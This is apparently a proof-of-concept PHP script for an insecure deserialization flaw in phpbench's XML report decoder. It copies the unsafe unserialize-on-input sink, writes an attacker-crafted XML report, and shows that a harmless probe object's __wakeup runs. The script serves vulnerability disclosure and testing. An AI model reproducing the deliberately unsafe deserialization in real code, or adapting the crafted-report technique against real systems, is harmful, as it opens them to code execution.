<?php
/** Standalone PoC for phpbench/phpbench XmlDecoder insecure deserialization.
 *
 * The original project uses DOMElement in lib/Serializer/XmlDecoder.php. This
 * standalone PoC avoids requiring ext-dom in the reproduction container, while
 * preserving the vulnerable sink behavior:
 *   unserialize(base64_decode($parameterEl->nodeValue))
 */
ini_set('display_errors', '1');
error_reporting(E_ALL);
const PARAM_TYPE_SERIALIZED = 'serialized';
const MARKER_FILE = '/tmp/phpbench_xml_deserialization_poc_marker';
class PhpBenchInvAuditProbe {
    public string $message = 'unset';
    public function __wakeup(): void { file_put_contents(MARKER_FILE, "__wakeup executed: " . $this->message . "\n"); }
}
function vulnerableDecodeParametersFromXml(string $xml): array {
    $parameters = [];
    if (!preg_match_all('/<parameter\s+name="([^"]+)"\s+type="([^"]+)"\s*>\s*<!\[CDATA\[(.*?)\]\]>\s*<\/parameter>/s', $xml, $matches, PREG_SET_ORDER)) {
        throw new RuntimeException('No matching parameter elements found');
    }
    foreach ($matches as $m) {
        $name = $m[1];
        $type = $m[2];
        $nodeValue = $m[3];
        if ($type === PARAM_TYPE_SERIALIZED) {
            // Vulnerable line equivalent to PhpBench\Serializer\XmlDecoder.php line 236.
            $parameters[$name] = unserialize(base64_decode($nodeValue));
            continue;
        }
        $parameters[$name] = $nodeValue;
    }
    return $parameters;
}
@unlink(MARKER_FILE);
$probe = new PhpBenchInvAuditProbe();
$probe->message = 'attacker-controlled serialized object from XML parameter';
$payload = base64_encode(serialize($probe));
$xml = <<<XML
<?xml version="1.0"?>
<phpbench>
  <suite tag="attacker" date="2026-06-28" config-path="phpbench.json" uuid="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">
    <benchmark class="AttackerBenchmark"><subject name="bench"><variant revs="1" warmup="0" sleep="0" output-time-unit="microseconds" output-time-precision="3" output-mode="time" retry-threshold="0"><parameter-set name="evil"><parameter name="probe" type="serialized"><![CDATA[$payload]]></parameter></parameter-set></variant></subject></benchmark>
  </suite>
</phpbench>
XML;
file_put_contents(__DIR__ . '/malicious-phpbench-report.xml', $xml);
$params = vulnerableDecodeParametersFromXml($xml);
printf("[*] Wrote malicious XML report: %s\n", __DIR__ . '/malicious-phpbench-report.xml');
printf("[*] Decoded parameter class: %s\n", is_object($params['probe'] ?? null) ? get_class($params['probe']) : gettype($params['probe'] ?? null));
printf("[*] Marker file exists after decode: %s\n", file_exists(MARKER_FILE) ? 'yes' : 'no');
if (file_exists(MARKER_FILE) && ($params['probe'] ?? null) instanceof PhpBenchInvAuditProbe) {
    echo "[VULNERABLE] unserialize() instantiated an attacker-controlled object and executed __wakeup during XML decoding.\n";
    echo file_get_contents(MARKER_FILE); exit(0);
}
echo "[NOT VULNERABLE] attacker-controlled serialized object was not instantiated.\n"; exit(1);
